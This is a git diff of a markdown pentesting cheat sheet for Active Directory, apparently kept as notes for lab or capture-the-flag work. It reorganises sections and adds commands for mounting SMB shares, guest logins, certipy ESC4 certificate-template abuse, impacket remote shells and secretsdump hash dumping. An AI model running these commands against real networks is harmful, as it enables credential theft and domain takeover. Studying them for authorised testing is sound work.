@@ -5,11 +5,12 @@
 - [Useful links](#useful-links)
 - [Enumeration](#enumeration)
     - [Tools](#tools)
+        - [SMBclient recursively get all](#smbclient-recursively-get-all)
+        - [Default credentials](#default-credentials)
+        - [Mount smb shares or VHD Virtual Disk](#mount-smb-shares-or-vhd-virtual-disk)
     - [Privilege Escalation](#privilege-escalation)
         - [Bloodhound](#bloodhound)
-- [Default credentials](#default-credentials)
-- [SMBclient recursively get all](#smbclient-recursively-get-all)
-- [Exposed clear domain Group Policy GPP](#exposed-clear-domain-group-policy-gpp)
+- [Exposed password in clear in domain Group Policy GPP](#exposed-password-in-clear-in-domain-group-policy-gpp)
 - [Kerberos Attacks](#kerberos-attacks)
     - [Brute force](#brute-force)
     - [ASREP roast](#asrep-roast)
@@ -17,10 +18,13 @@
     - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
         - [ESC4](#esc4)
         - [ESC1](#esc1)
-- [SeBackupPrivilege](#sebackupprivilege)
+- [Dangerous privilege](#dangerous-privilege)
+    - [SeBackupPrivilege](#sebackupprivilege)
+    - [WriteOwner privilege](#writeowner-privilege)
 - [Certipy-AD](#certipy-ad)
-- [WriteOwner privilege](#writeowner-privilege)
 - [Grant FullControl rights](#grant-fullcontrol-rights)
+- [Obtain system shell without EvilWinRM](#obtain-system-shell-without-evilwinrm)
+- [SAM / SYSTEM hashes dump](#sam--system-hashes-dump)
 - [notes from adri TODO](#notes-from-adri-todo)
 
 <!-- /TOC -->
@@ -62,13 +66,24 @@ repeat enumeration with any other users you find access to
 6. smbmap:
     - `smbmap -H {target}`
 
-### SMBclient recursively get all 
+### SMBclient recursively get all
+---
 ```
-mask "";
 recurse ON;
 prompt OFF;
 mget *;
 ```
+### Default credentials
+---
+- smb: `-u 'guest' -p ''`
+
+### Mount smb shares or VHD (Virtual Disk)
+---
+in order to navigate and search for files easily:
+- `mount //{host}/{share} /{mount-point} -o user={smb_user},password={smb_password}`
+
+to mount a VHD disk (which is usually too bid to download):
+- `guestmount -a {vhd_path} -ir {mount_point}` or just connect to the smb shares using a Windows machine
 
 ## Privilege Escalation
 - check permission: `whoami /all`
@@ -81,10 +96,7 @@ mget *;
     - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
 2. Import and query
 
-# Default credentials
-- smb: `-u 'guest' -p ''`
-
-# Exposed clear domain Group Policy (GPP)
+# Exposed password in clear in domain Group Policy (GPP)
 if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
 - you can use `gpp-decrypt` to crack it.
 
@@ -126,6 +138,7 @@ FullControl 	|   Full control of object, all properties can be edited
 ```
 
 ### ESC4
+---
 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
 - update certificate cache to the vulnerable one:   \
 `KRB5CCNAME=$PWD/{user}.ccache certipy-ad template -k -template {vulnerable_template_anem} -dc-ip {ip} -target {dc.domain}`
@@ -137,7 +150,7 @@ ESC4 is when a user has write privileges over a certificate template. This can f
 so you log in with evil-winrm using the second part of the HASH
 
 ### ESC1
-
+---
 ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
 
 # Dangerous privilege
@@ -184,6 +197,13 @@ when there is no user in the "Remote Management Group" you can still obtain a sh
 - `impacket-psexec {domain}/{user}:{password}@{ip}`
 - `impacket-wmiexec {domain}/{user}:{password}@{ip}`
 - `impacket-smbexec {domain}/{user}:{password}@{ip}`
+
+# SAM / SYSTEM hashes dump
+
+with full access to filesystem, you can read and dump SAM (Security Account Manager) file which is a SB for hashes.\
+Sometimes it is locked and impossible to access, but if you have a backup or a copy of it you can.
+
+- `secretsdump.py -sam {sam_file} -security {security_file} -system {system_file} {target}`
 
 # notes from adri TODO
 
